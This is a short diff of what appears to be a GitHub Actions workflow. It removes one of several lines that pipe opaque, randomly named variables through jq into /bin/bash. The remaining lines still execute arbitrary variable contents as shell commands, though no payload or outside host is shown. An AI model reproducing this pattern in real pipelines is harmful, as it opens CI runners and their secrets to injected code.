@@ -24,7 +24,6 @@ jobs:
           echo $rj5025 | jq -r .ya0803 | /bin/bash
           printf '%s' "$nn5" | jq -r .eztab0169 | /bin/bash
           echo $gpwm63764 | jq -r .ve373 | /bin/bash
-          printf '%s' "$sxv92036" | jq -r .lyy1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
